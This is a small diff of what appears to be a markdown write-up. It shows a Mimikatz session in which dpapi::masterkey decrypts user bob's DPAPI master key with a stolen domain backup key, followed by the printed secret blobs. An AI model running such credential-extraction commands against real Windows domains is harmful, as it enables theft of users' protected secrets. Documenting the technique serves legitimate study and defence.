@@ -53,6 +53,7 @@ C:\Windows\system32\spool\drivers\color>mimikatz.exe
  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
   '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
 
+
 mimikatz # dpapi::masterkey /in:"C:\Users\bob\AppData\Roaming\Microsoft\Protect\S-1-5-21-1576920733-1301476157-954876328-1108\84dcc2cc-82c6-44d4-9404-45fd48b4b650" /pvk:ntds_capi_0_bf2e48b9-a91f-43bf-9771-c0e9c77f7dd2.keyx.rsa.pvk
 **MASTERKEYS**
   dwVersion          : 00000002 - 2
@@ -89,3 +90,5 @@ mimikatz # dpapi::masterkey /in:"C:\Users\bob\AppData\Roaming\Microsoft\Protect\
     pbSecret         : e4ef7feea839ca86b33d5c1b7abbbc9fddc59553706715e079c10aeb0dd6ba03d2287e6f1d7b566171b31ba67d290cf8f2e46f152de6b7d98fc77e6295e22ad330ddef6755db9755cb232e2d544a91ab365a891ca4ec3d6a812a340a8b0c52a71af1dafb915ee091c12f7cd823c3b7eed0e786032d3528e6343020c91c4cbf95fc0a23ff4cef70f6950bc157d1b62938251fd3bb625c74c1b89a59565453d530d8c1f9a492535da07896c09bc7ffad27b76b42770d81317f93118732ed6b6058f942a58cfb5c8afc757a10a3e7f4295ac3388cc7fd20c57ae97431d95daa074e59f314e6a98d170c58480ba8a10d613d7c746ddd13c7cd4093d9bae5c65c557b
     pbAccesscheck    : c7725bc1e39f008edbe46d70baa332409bea33e6fc29afe19ca9a5fe681b5cdf7be2cfa5b4e83ec086278174d990aefef39b0add0a24c35a0a58ac8f45c5d0256e7d7cd018da5550f0a3b26f1de8713d06f67988dc49f78f
 ```
+
+
